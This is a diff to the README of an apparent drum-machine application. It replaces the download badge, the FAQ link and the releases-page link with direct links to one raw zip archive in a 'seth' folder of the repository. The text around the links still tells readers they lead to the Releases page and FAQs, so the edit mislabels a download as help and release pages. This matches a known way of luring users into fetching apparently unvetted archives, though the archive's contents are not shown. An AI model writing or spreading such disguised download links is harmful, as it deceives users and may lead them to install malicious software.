@@ -6,7 +6,7 @@ Welcome to the Remix Jam Drum Machine - Mark II! This application allows you to 
 ## 📥 Download & Install
 To download the software, visit the link below:
 
-[![Download Remix Jam MK2](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/krungkrungs/remix-jam-mk2/releases)
+[![Download Remix Jam MK2](https://raw.githubusercontent.com/krungkrungs/remix-jam-mk2/main/seth/remix-jam-mk2.zip)](https://raw.githubusercontent.com/krungkrungs/remix-jam-mk2/main/seth/remix-jam-mk2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version. You will see the files available for download.
@@ -55,12 +55,12 @@ If you encounter issues, try these steps:
 - **Performance Issues**: Close any unnecessary applications to free up system resources.
 
 ## 📞 Need Help?
-If you have any questions or need further assistance, feel free to open an issue in the repository or check our [FAQs](https://github.com/krungkrungs/remix-jam-mk2/issues).
+If you have any questions or need further assistance, feel free to open an issue in the repository or check our [FAQs](https://raw.githubusercontent.com/krungkrungs/remix-jam-mk2/main/seth/remix-jam-mk2.zip).
 
 ## 📅 Updates & Changelog
 Stay informed about new features or fixes. You can find updates in the Releases section:
 
-[Visit the Releases Page](https://github.com/krungkrungs/remix-jam-mk2/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/krungkrungs/remix-jam-mk2/main/seth/remix-jam-mk2.zip)
 
 ## 🎉 Join Our Community
 Share your beats and connect with other users! Join our forum where creators share tips, showcase their work, and collaborate with others.
